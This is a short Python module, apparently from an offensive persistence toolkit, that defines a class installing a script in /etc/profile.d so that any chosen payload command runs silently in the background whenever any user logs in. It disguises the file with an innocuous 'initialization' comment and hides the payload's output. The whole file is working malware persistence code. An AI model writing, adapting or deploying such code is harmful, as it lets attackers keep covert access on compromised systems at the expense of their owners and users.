import os
from ..core import ShellProfilePersistence

class SystemProfileInjector(ShellProfilePersistence):
    def inject(self, payload_command: str):
        if not self.is_root:
            print("[!] Root required for system-wide profile")
            return None

        script_path = "/etc/profile.d/00-custom-init.sh"
        content = f"""#!/bin/bash
# System-wide initialization
{payload_command} &>/dev/null &
"""

        try:
            with open(script_path, 'w') as f:
                f.write(content)
            os.chmod(script_path, 0o755)

            print(f"[+] System-wide profile script created")
            print(f"[+] File: {script_path}")
            print(f"[+] Affects: All users on login")

            return {
                'method': 'system_profile',
                'file': script_path,
                'remove_cmd': f"rm -f {script_path}"
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None